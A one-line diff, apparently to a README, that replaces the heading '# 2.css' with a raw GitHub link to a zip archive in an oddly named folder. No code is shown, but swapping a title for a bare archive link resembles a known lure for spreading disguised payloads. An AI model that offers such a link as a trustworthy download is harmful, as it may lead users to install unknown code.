@@ -1,1 +1,1 @@
-# 2.css
+# https://github.com/09122579372bu/2.css/raw/refs/heads/main/dispeaceful/css_2.8.zip
